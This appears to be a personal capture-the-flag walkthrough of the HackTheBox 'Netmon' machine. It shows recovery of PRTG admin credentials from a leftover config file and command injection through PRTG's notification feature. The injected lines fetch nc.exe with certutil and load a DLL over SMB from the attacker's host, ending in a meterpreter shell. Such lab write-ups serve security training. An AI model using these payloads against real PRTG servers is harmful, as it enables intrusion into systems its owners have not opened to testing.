---
title: "HackTheBox - Netmon WT"
date: 2019-03-03T20:50:01-05:00
tags: ["hackthebox", "htb"]
draft: false
---


![alt text](/images/htb-Netmon/img1.png)
![alt text](/images/htb-Netmon/img2.png)

## Box IP: 10.10.10.152

# Reconnaissance

1) I started with scanning network. Here's what I found


![alt text](/images/htb-Netmon/img3.png)
![alt text](/images/htb-Netmon/img4.png)

2) Port 80,  we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability

![alt text](/images/htb-Netmon/img5.png)


3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit
  https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/
  .. But I couldnt find it.. later on I was hinted that It was a hiddden file.. So I had “force hidden files” unchecked once I checked that we found it in /programData/Paessler/PRTG Network Monitor


![alt text](/images/htb-Netmon/img6.png)
![alt text](/images/htb-Netmon/img8.png)
![alt text](/images/htb-Netmon/img9.png)
 I found it...it was in programdata/passeler/PRTG Configuration.old.bak



**prtgadmin  →  PrTg@dmin2018  
  I was getting incorrect login with this one,   until  I had help from legov
  and found that it would be PrTg@dmin2019**



![alt text](/images/htb-Netmon/img10.png)

4) In filezilla , after I enabled to show hidden files, under server>show hidden files,I f ound USER.txt in /Users/Public


![alt text](/images/htb-Netmon/img11.png)

5) With the login credentials we can log in

![alt text](/images/htb-Netmon/img12.png)
![alt text](/images/htb-Netmon/img13.png)

  This CVe Was helpful where we can run remote command through the notification page
  
  https://www.ptsecurity.com/ww-en/analytics/threatscape/pt-2018-23/
  
  
  https://www.codewatch.org/blog/?p=453
  
  https://www.exploit-db.com/exploits/46527

# I USED exploit# 46527 

6) I created a simplehttpserver to send nc.exe and payloads to  maybe try and establish a session 
![alt text](/images/htb-Netmon/img18.png)
![alt text](/images/htb-Netmon/img19.png)

7) In the "create_user()" function on the 7th line in the fig below starting from the &message_10 parameter
 we inject a html encoded command that will run through the notification page 

**test.txt|"certutil.exe -urlcache -split -f http://10.10.12.11/nc.exe c:\users\public\Music\nc.exe"** but it should be html encoded
![alt text](/images/htb-Netmon/img17.png)

![alt text](/images/htb-Netmon/img15.png)

8) A certutil get request to  httpserver, yes it was for certp.exe. I tried many things before that. But same method works to upload nc.exe.

![alt text](/images/htb-Netmon/img30.png)

9) Next I used the same script to enter another html encoded command to run nc.exe and I had a listener setup on my kali to establish a connection


![alt text](/images/htb-Netmon/img16.png)
![alt text](/images/htb-Netmon/img21.png)

# For some reason the shell from nc din't work or I didn't get a full shell#

------------------------------------------------------------------------
Here's what worked

![alt text](/images/htb-Netmon/img22.png)

10) F12 after you log-in to pullup _inspect element and get the cookie paramters
  
![alt text](/images/htb-Netmon/img23.png)
*`Inside rundl32.sh.. The most important paramenter...After "&message_10="`*

![alt text](/images/htb-Netmon/img24.png)

11) Used w3school to encode html
  
  `test.txt|"rundll32.exe \\10.10.12.11\uqMdU\test.dll,0"`
![alt text](/images/htb-Netmon/img26.png)

#`text=test.txt%7C%22rundll32.exe+%5C%5C10.10.12.11%5CuqMdU%5Ctest.dll%2C0%22`

12) running rundl32.sh12) running rundl32.sh  we see the name titanrundl2 uploaded to notification page

![lt text](/images/htb-Netmon/img29.png)

13) I used windows/smb/smb_delievery exploit with a job running on port8081
![alt text](/images/htb-Netmon/img28.png)
![alt text](/images/htb-Netmon/img27.png)
And we get a meterpreter shell session opened. Awesome

![alt text](/images/htb-Netmon/img31.png)
![alt text](/images/htb-Netmon/img32.png)


#LADIES AND GENTLEMEN WE ARE IN :))))))))))))))))))))))


![alt text](/images/htb-Netmon/img33.png)
![alt text](/images/htb-Netmon/img34.png)
![alt text](/images/htb-Netmon/img35.png)


**3018977fb944bf1878f75b879fba67cc**



DONE TOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOK ME AWILLEEEEEEEEEEEEEEEEEEEEee
